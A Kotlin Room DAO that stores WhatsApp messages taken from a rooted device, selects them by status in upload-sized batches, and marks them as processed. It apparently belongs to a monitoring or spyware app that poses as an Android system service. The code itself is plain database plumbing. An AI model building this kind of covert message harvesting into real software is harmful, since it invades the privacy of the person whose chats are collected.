package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.WhatsAppRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface WhatsAppRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(whatsApp: List<WhatsAppRooted>)

    @Query("Select * from whats_app_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllWhatsAppMessages(status: Int): List<WhatsAppRooted>

    @Query("Update whats_app_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from whats_app_rooted")
    fun selectMaxTimeStamp(): Long?
}